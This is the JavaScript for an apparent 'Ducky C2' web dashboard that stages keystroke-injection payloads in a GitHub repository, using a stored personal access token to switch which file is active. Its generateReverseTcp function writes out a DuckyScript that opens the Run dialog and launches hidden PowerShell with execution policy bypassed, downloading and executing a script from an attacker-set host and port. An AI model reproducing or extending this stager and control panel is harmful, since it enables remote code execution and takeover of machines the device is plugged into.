const API_BASE = 'https://api.github.com';

// DOM Elements
const elements = {
    settings: document.getElementById('settings'),
    dashboard: document.getElementById('dashboard'),
    repoName: document.getElementById('repoName'),
    token: document.getElementById('githubToken'),
    connectBtn: document.getElementById('connectBtn'),
    statusIndicator: document.getElementById('connectionStatus'),
    fileList: document.getElementById('fileList'),
    refreshBtn: document.getElementById('refreshFiles'),
    tcpHost: document.getElementById('tcpHost'),
    tcpPort: document.getElementById('tcpPort'),
    generateTcpBtn: document.getElementById('generateTcpBtn'),
    scriptOutput: document.getElementById('scriptOutput'),
    copyBtn: document.getElementById('copyScriptBtn'),
    tabBtns: document.querySelectorAll('.tab-btn'),
    tabContents: document.querySelectorAll('.tab-content')
};

// State
let state = {
    token: localStorage.getItem('ducky_token') || '',
    repo: localStorage.getItem('ducky_repo') || '',
    targetFile: localStorage.getItem('ducky_target') || 'payload.txt'
};

// Initialization
function init() {
    if (state.token && state.repo) {
        elements.repoName.value = state.repo;
        elements.token.value = state.token;
        // Don't auto-show, let them click connect to verify again or just show login
        // Actually, let's try to auto-connect silently
        testConnection(state.repo, state.token).then(success => {
            if (success) showDashboard();
        });
    }
    setupEventListeners();
}

function setupEventListeners() {
    elements.connectBtn.addEventListener('click', async () => {
        const repo = elements.repoName.value.trim();
        const token = elements.token.value.trim();
        const btn = elements.connectBtn;

        if (!repo || !token) {
            alert('Please enter both Repo Name and Token');
            return;
        }

        btn.innerText = 'CONNECTING...';
        btn.disabled = true;

        try {
            const result = await testConnection(repo, token);
            if (result.success) {
                saveCredentials(repo, token);
                showDashboard();
            } else {
                alert(`CONNECTION FAILED:\n${result.error}\n\nCheck your Token permissions (Repo: Read/Write) and Repo Name.`);
            }
        } catch (e) {
            alert('System Error: ' + e.message);
        } finally {
            btn.innerText = 'INITIALIZE_CONNECTION';
            btn.disabled = false;
        }
    });

    elements.refreshBtn.addEventListener('click', loadFiles);

    elements.generateTcpBtn.addEventListener('click', () => {
        const host = elements.tcpHost.value || '127.0.0.1';
        const port = elements.tcpPort.value || '4444';
        const script = generateReverseTcp(host, port);
        elements.scriptOutput.value = script;
    });

    elements.copyBtn.addEventListener('click', () => {
        elements.scriptOutput.select();
        document.execCommand('copy');
        const originalText = elements.copyBtn.innerText;
        elements.copyBtn.innerText = 'COPIED!';
        setTimeout(() => elements.copyBtn.innerText = originalText, 2000);
    });

    elements.tabBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            elements.tabBtns.forEach(b => b.classList.remove('active'));
            elements.tabContents.forEach(c => c.classList.add('hidden'));
            btn.classList.add('active');
            document.getElementById(btn.dataset.tab).classList.remove('hidden');
        });
    });
}

// GitHub API Functions
async function testConnection(repo, token) {
    try {
        const response = await fetch(`${API_BASE}/repos/${repo}`, {
            headers: {
                'Authorization': `Bearer ${token}`, // Changed to Bearer for better PAT support
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        if (response.ok) {
            return { success: true };
        } else {
            return { success: false, error: `${response.status} ${response.statusText}` };
        }
    } catch (e) {
        return { success: false, error: e.message };
    }
}

async function loadFiles() {
    elements.fileList.innerHTML = '<div class="loading">LOADING_FILES...</div>';

    try {
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents`, {
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        if (!response.ok) {
            const err = await response.json();
            throw new Error(err.message || response.statusText);
        }

        const files = await response.json();
        renderFiles(files);
    } catch (e) {
        elements.fileList.innerHTML = `<div class="terminal-output" style="color: var(--accent)">ERROR: ${e.message}</div>`;
    }
}

async function updateFile(path, content, message = 'Update payload via Ducky C2') {
    try {
        let sha = '';
        try {
            const current = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
                headers: {
                    'Authorization': `Bearer ${state.token}`,
                    'Accept': 'application/vnd.github.v3+json'
                }
            });
            if (current.ok) {
                const data = await current.json();
                sha = data.sha;
            }
        } catch (e) { }

        const body = {
            message: message,
            content: btoa(content),
            branch: 'main'
        };

        if (sha) body.sha = sha;

        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
            method: 'PUT',
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(body)
        });

        if (!response.ok) {
            const err = await response.json();
            throw new Error(err.message || response.statusText);
        }

        alert(`SUCCESS: Wrote to ${path}`);
        loadFiles();
    } catch (e) {
        alert(`ERROR: ${e.message}`);
    }
}

// UI Functions
function showDashboard() {
    elements.settings.classList.add('hidden');
    elements.dashboard.classList.remove('hidden');
    elements.statusIndicator.innerText = 'CONNECTED';
    elements.statusIndicator.classList.add('connected');
    loadFiles();
}

function renderFiles(files) {
    elements.fileList.innerHTML = '';

    if (!Array.isArray(files)) return;

    files.filter(f => f.type === 'file').forEach(file => {
        const card = document.createElement('div');
        card.className = 'file-card';

        const isTarget = file.name === state.targetFile;
        if (isTarget) card.classList.add('active');

        card.innerHTML = `
            <div class="file-info">
                <div class="file-name">${file.name}</div>
                <div class="file-size">${(file.size / 1024).toFixed(2)} KB</div>
            </div>
            <div class="file-actions">
                ${!isTarget ? `<button class="cyber-btn small" onclick="activatePayload('${file.name}')">ACTIVATE</button>` : '<span class="status-indicator connected">ACTIVE</span>'}
            </div>
        `;
        elements.fileList.appendChild(card);
    });
}

function saveCredentials(repo, token) {
    state.repo = repo;
    state.token = token;
    localStorage.setItem('ducky_repo', repo);
    localStorage.setItem('ducky_token', token);
}

// Logic Functions
window.activatePayload = async function (filename) {
    if (!confirm(`Overwrite ${state.targetFile} with content of ${filename}?`)) return;

    try {
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/${filename}`, {
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });
        const data = await response.json();
        const content = atob(data.content);

        await updateFile(state.targetFile, content, `Activated ${filename}`);
    } catch (e) {
        alert('Error activating payload: ' + e.message);
    }
};

function generateReverseTcp(host, port) {
    return `
REM Reverse TCP Payload generated by Ducky C2
DELAY 1000
GUI r
DELAY 200
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object Net.WebClient).DownloadString('http://${host}:${port}/payload.ps1')"
ENTER
    `.trim();
}

// Start
init();
